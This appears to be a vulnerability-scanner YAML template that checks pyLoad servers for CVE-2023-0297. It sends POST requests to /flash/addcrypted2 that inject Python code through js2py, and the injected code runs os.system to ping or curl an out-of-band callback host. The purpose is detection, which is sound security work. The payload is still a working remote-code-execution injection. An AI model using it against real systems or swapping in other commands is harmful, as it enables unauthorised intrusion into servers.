name: yaml-poc-pyload-pyload-rce-CVE-2023-0297
binding: b846b208-9e79-41bb-97c1-e723160502a4
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/171096/pyLoad-js2py-Python-Execution.html
        - https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d
        - https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65
    vulnerability:
        id: 7518b123-1d90-4ba5-afb1-9dbdeb691f0b
        level: critical
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
    reverseDomain: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /flash/addcrypted2
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: jk=pyimport%20os;os.system("ping%20-c%201%20{{reverseDomain}}");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
            follow_redirects: false
        expression: reverse.wait(5)
    r1:
        request:
            cache: true
            method: POST
            path: /flash/addcrypted2
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: jk=pyimport%20os;os.system("curl%20{{reverseURL}}");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
            follow_redirects: false
        expression: reverse.wait(5)
expression: r0() || r1()
